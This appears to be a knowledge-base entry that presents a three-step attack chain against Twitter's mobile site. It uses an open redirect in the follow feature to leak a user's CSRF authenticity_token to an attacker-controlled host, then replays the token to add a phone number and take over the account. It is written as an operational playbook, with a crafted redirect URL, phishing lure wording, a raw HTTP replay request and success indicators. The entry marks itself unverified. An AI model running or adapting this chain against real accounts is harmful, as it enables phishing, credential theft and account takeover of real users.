---
id: a1b2c3d4-e5f6-7890-abcd-ef1234567890
tags:
  - open-redirect
  - token-leak
  - account-takeover
  - csrf
  - twitter
type: attack_chain
tools: []
tactics:
  - '[[Initial Access]]'
  - '[[Credential Access]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T12:00:00Z'
procedures:
  - '[[procedures/Craft-Malicious-URL-for-Twitter-Follow-Open-Redirect]]'
  - '[[procedures/Trick-Victim-to-Leak-Authenticity-Token-via-Follow-Click]]'
  - '[[procedures/Exploit-Leaked-Token-for-Twitter-Account-Takeover]]'
step_count: 3
techniques:
  - '[[Drive-by Compromise]]'
  - '[[Unsecured Credentials]]'
  - '[[Valid Accounts]]'
updated_at: '2025-12-14T17:24:26.568Z'
description: >-
  A multi-stage attack exploiting an open redirect vulnerability in Twitter's
  mobile messaging follow feature to leak the user's CSRF authenticity_token,
  enabling unauthorized actions and full account takeover.
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Credential Access]]'
mitre_techniques:
  - '[[Drive-by Compromise]]'
  - '[[Unsecured Credentials]]'
  - '[[Valid Accounts]]'
---
# Open Redirect in Twitter Mobile Follow Feature Leading to Authenticity Token Leak and Account Takeover

Multi-stage attack chain demonstrating a complete attack workflow exploiting an open redirect in Twitter's mobile messaging follow feature to steal the authenticity_token and achieve full account takeover.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 3 |
| Execution Time | ~5 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Craft Malicious URL] --> B[Trick Victim to Click Follow]
    B --> C[Capture and Use Leaked Token]
    C --> D[Account Takeover]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#3498db
    style D fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- None (relies on browser and attacker-controlled server)

### Target Environment

- Twitter mobile web application (https://mobile.twitter.com)
- Attacker requires a domain/server to receive POST requests

### Initial Access Requirements

- Social engineering to get victim to visit malicious URL
- No prior credentials needed

## Detailed Attack Procedures

### Step 1: Craft Malicious URL
procedure: [[procedures/Craft-Malicious-URL-for-Twitter-Follow-Open-Redirect]]

**Objective**: Create a URL that exploits the open redirect in the follow feature to point to an attacker-controlled domain.

**Instructions**: Construct the URL using the recipient parameter set to an external domain under attacker control. For example:

```url
https://mobile.twitter.com/messages/follow?recipient=/example.com
```

Host this URL on a phishing page or send via email/social engineering.

**Expected Output**: A clickable link that, when accessed by a logged-in victim, loads the Twitter follow page with the malicious redirect.

**Success Indicators**:
- URL is accessible and loads Twitter's follow interface
- Recipient parameter is accepted without validation

### Step 2: Trick Victim to Click Follow
procedure: [[procedures/Trick-Victim-to-Leak-Authenticity-Token-via-Follow-Click]]

**Objective**: Induce the victim to interact with the follow button, triggering a POST request to the attacker-controlled domain containing the authenticity_token.

**Instructions**: Use social engineering (e.g., phishing email claiming "Follow this user for exclusive content") to get the victim to visit the URL and click 'Follow'. Monitor the attacker server for incoming POST requests.

**Expected Output**: A POST request to https://example.com/ with form data including the victim's authenticity_token.

**Success Indicators**:
- POST request received on attacker server
- authenticity_token extracted from request body

### Step 3: Exploit Leaked Token
procedure: [[procedures/Exploit-Leaked-Token-for-Twitter-Account-Takeover]]

**Objective**: Use the stolen token to perform unauthorized actions, culminating in account takeover via phone number addition and recovery.

**Instructions**: Replay the token in subsequent requests to Twitter's API. For example, add a phone number:

```http
POST /sessions/add_phone HTTP/1.1
Host: mobile.twitter.com
...
Content-Type: application/x-www-form-urlencoded

phone_number=attacker_phone&authenticity_token=STOLEN_TOKEN
```

Then initiate password reset using the added phone.

**Expected Output**: Successful API actions like tweeting, following, or account recovery.

**Success Indicators**:
- Unauthorized actions performed (e.g., new tweet posted)
- Account password reset and control gained

## Attack Chain Summary

### Key Achievements

1. Leaked CSRF authenticity_token via open redirect
2. Performed unauthorized API operations including phone addition
3. Achieved full account takeover through recovery mechanisms

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Drive-by Compromise]]
- [[Unsecured Credentials]]
- [[Valid Accounts]]

### MITRE ATT&CK Tactics

- [[Initial Access]]
- [[Credential Access]]

---
*Last updated: 2023-10-01T12:00:00Z*
